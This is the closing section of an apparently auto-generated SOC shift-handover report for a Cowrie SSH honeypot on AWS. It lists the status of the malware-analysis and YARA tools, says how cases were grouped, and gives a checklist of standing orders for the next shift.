| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 37 priority case(s) shown individually · 16 recon entry/entries in table (5 group(s) consolidating 131 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-29T23:17:37Z_
